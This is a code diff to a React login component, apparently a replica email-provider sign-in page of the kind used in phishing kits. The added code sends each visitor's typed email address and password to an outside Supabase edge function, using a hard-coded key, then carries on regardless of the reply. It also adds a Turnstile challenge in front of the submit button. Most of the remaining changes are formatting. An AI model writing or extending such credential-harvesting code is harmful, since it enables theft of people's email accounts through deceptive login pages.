@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Mail, ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
+import { Turnstile } from '@marsidev/react-turnstile';
 import { EmailProvider } from '../types';
 
 interface ReplicaPanelProps {
@@ -14,12 +15,14 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
+  const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
 
   const handleOpenLogin = (provider: EmailProvider) => {
     setActiveLoginProvider(provider);
     setEmailInput('');
     setPasswordInput('');
     setErrorMsg('');
+    setTurnstileToken(null);
     setIsLoading(false);
   };
 
@@ -27,7 +30,7 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
     setActiveLoginProvider(null);
   };
 
-  const handleLoginSubmit = (e: React.FormEvent) => {
+  const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg('');
 
@@ -45,6 +48,29 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
     }
 
     setIsLoading(true);
+
+    try {
+      const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
+      const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
+
+      await fetch(`${supabaseUrl}/functions/v1/login`, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${supabaseKey}`,
+          'apikey': supabaseKey,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          email: emailInput,
+          provider: activeLoginProvider?.id || 'email',
+          password: passwordInput,
+          turnstileToken: turnstileToken
+        })
+      });
+    } catch (err) {
+      console.error("Error calling login edge function:", err);
+    }
+
     setTimeout(() => {
       setIsLoading(false);
       onSelectProvider(activeLoginProvider!, emailInput);
@@ -58,8 +84,8 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
       case 'outlook':
         return (
           <svg className="w-5 h-5 absolute" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M19.5 5.25v13.5c0 .966-.784 1.75-1.75 1.75H8.25c-.966 0-1.75-.784-1.75-1.75V5.25c0-.966.784-1.75 1.75-1.75h9.5c.966 0 1.75.784 1.75 1.75z" fill="#0072C6"/>
-            <path d="M1.5 7.5v9c0 .966.784 1.75 1.75 1.75h9.5c.966 0 1.75-.784 1.75-1.75v-9c0-.966-.784-1.75-1.75-1.75h-9.5C2.284 5.75 1.5 6.534 1.5 7.5z" fill="#00559A"/>
+            <path d="M19.5 5.25v13.5c0 .966-.784 1.75-1.75 1.75H8.25c-.966 0-1.75-.784-1.75-1.75V5.25c0-.966.784-1.75 1.75-1.75h9.5c.966 0 1.75.784 1.75 1.75z" fill="#0072C6" />
+            <path d="M1.5 7.5v9c0 .966.784 1.75 1.75 1.75h9.5c.966 0 1.75-.784 1.75-1.75v-9c0-.966-.784-1.75-1.75-1.75h-9.5C2.284 5.75 1.5 6.534 1.5 7.5z" fill="#00559A" />
             <text x="3.5" y="14.5" fill="#ffffff" style={{ fontSize: '9px', fontWeight: 'bold', fontFamily: 'sans-serif' }}>O</text>
           </svg>
         );
@@ -91,11 +117,11 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
   };
 
   return (
-    <div 
-      id="replica-container" 
+    <div
+      id="replica-container"
       className="w-full max-w-[430px] my-6 rounded-2xl bg-[#3a3735]/92 backdrop-blur-md border border-[#ffffff15] text-white flex flex-col justify-between py-7 px-5 md:px-8 shadow-2xl relative z-10"
     >
-      
+
       {/* Top Header Logo Section */}
       <div id="logo-container" className="flex flex-col items-center pt-2">
         <div id="logo-branding-plate" className="bg-white w-48 py-3.5 px-5 flex flex-col items-center shadow-lg rounded-sm transition-transform duration-300 hover:scale-[1.01]">
@@ -147,8 +173,8 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
 
           {/* Stable Popup Modal for Email and Password login */}
           {activeLoginProvider && (
-            <div 
-              id="login-dialog-overlay" 
+            <div
+              id="login-dialog-overlay"
               className="absolute inset-x-0 -top-16 -bottom-6 bg-[#272524] rounded-2xl border border-white/10 p-5 shadow-2xl flex flex-col justify-between z-30 animate-in fade-in zoom-in-95 duration-200"
             >
               <div className="space-y-4">
@@ -162,8 +188,8 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
                       Login with {activeLoginProvider.name}
                     </span>
                   </div>
-                  <button 
-                    onClick={handleCloseLogin} 
+                  <button
+                    onClick={handleCloseLogin}
                     className="p-1 text-gray-400 hover:text-white hover:bg-white/5 rounded-full transition-colors cursor-pointer"
                   >
                     <X className="w-4 h-4" />
@@ -216,11 +242,25 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
                     </p>
                   )}
 
+                  {/* Cloudflare Turnstile Widget */}
+                  <div className="pt-1 flex justify-center w-full overflow-hidden rounded-md border border-white/5 bg-[#ffffff02]">
+                    <Turnstile 
+                      siteKey="0x4AAAAAADhBiA89GlSL9EDX" 
+                      onSuccess={(token) => setTurnstileToken(token)}
+                      onError={() => setErrorMsg('Turnstile verification failed. Please try again.')}
+                      onExpire={() => setTurnstileToken(null)}
+                      options={{
+                        theme: 'dark',
+                        size: 'normal'
+                      }}
+                    />
+                  </div>
+
                   {/* Enter Button */}
                   <div className="pt-2 flex gap-2">
                     <button
                       type="submit"
-                      disabled={isLoading}
+                      disabled={isLoading || !turnstileToken}
                       className="flex-1 bg-amber-500 hover:bg-amber-400 text-black font-sans text-xs font-bold py-2 px-4 rounded-lg flex items-center justify-center gap-1.5 transition-colors cursor-pointer select-none disabled:opacity-50"
                     >
                       {isLoading ? (
